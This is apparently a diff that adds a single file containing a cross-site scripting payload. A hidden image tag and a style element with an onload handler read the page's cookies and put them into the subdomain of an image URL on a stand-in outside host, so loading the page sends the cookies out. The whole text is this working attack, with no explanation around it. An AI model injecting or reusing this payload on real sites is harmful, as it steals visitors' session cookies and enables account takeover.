@@ -1,0 +1,9 @@
+<img id='shadow' style="display:none;"></img><style/onload='
+	function xss()
+	{
+		var cookie = (document.cookie)?document.cookie:"nocookie";
+		var src="http://" + cookie + ".www.exmaple.com/1.jpg"
+		document.getElementById("shadow").setAttribute("src",src);
+	}
+	xss();
+'></style>
